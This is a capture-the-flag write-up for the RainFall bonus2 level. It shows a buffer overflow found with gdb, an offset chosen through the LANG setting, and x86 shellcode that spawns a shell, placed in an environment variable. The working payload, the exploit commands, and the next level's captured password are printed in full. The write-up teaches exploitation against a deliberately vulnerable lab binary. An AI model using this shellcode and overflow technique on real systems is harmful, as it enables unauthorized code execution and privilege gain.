# Bonus

- Once logged in, you will see a binary `bonus2`

```
[???]$ ssh localhost -p 4242 -l bonus2
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
bonus2@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
bonus2@RainFall:~$
bonus2@RainFall:~$ ls
bonus2
bonus2@RainFall:~$
```

let's check what the binary does

```
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaa
bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaa bbbbbbbbbbbbb
Hello aaaaaaaaaaaaaaaa
bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Hello aaaaaaaaaaaaaaaa
bonus2@RainFall:~$
bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Hello aaaaaaaaaaaaaaaa
bonus2@RainFall:~$ ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
bonus2@RainFall:~$
```

let's take a look at the binary by using `gdb`

```
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
[...]
0x08049988  language

gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
```

Since the program uses the function uses `strcat`, `strncpy`, it may be vulnerbable for buffer overflow
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
[...]
0x080483c0  strncpy
0x080483c0  strncpy@plt
[...]
```

we at least know there is a global variable called language, and another function `greetuser` exists.

by decompiling the source, if argc value is not equal to 3, the program will quit, and with the meaning of `argc == 3`, is the `envp` may be used in the function.

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	push   esi
   0x0804852e <+5>:	push   ebx
   0x0804852f <+6>:	and    esp,0xfffffff0
   0x08048532 <+9>:	sub    esp,0xa0
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:	je     0x8048548 <main+31>			; if argc != 3, then
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>			; jump to main+263
```

With analysis of the code, the program takes 2 arguments, and will be stored into a buffer of 40 bytes, and 32 bytes in order. the program will also check env variable of `LANG`, and set the global variable into either 1 (if LANG is equal to fi) or 2 (if LANG is equal to 2)

the output will be determined by the global variable LANG, will greet the message in English, Finnish, and dutch, then print with username. Because of the greet message `hello ` is not long enough to overrite the eip, `fi` or `nl` needs to be used in order to fill the off.

```
0x41366141 in ?? ()
gdb-peda$ Hyv piv AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
[offset: 18]

0x38614137 in ?? ()
gdb-peda$
[offset: 23]
```

We know using nl, the offset is 23, so let's try using this, and all we need to do is put shellcode in the env variable, find the address for the shellcode, and pass them into the payload to overwrite. So the payload will consist like this

```
export SHELLCODE=`python -c 'print("\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`

bonus2@RainFall:/tmp$ gcc -m32 getenv.c -o getenv					# using getenv.c in Resources
bonus2@RainFall:/tmp$ ./getenv
env address: 0xbffff84e #### THIS WILL CHANGE ####
```

```
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + address of the shellcode env. variable')

---
bonus2@RainFall:~$ /tmp/getenv
env address: 0xbffff854
---
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "\x90" * 23 + "\x54\xf8\xff\xbf"')

```

```
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ /tmp/getenv
env address: 0xbffff851
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x51\xf8\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBQ���
$ whoami
bonus3
$ cat /home/user/$(whoami)/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$
```
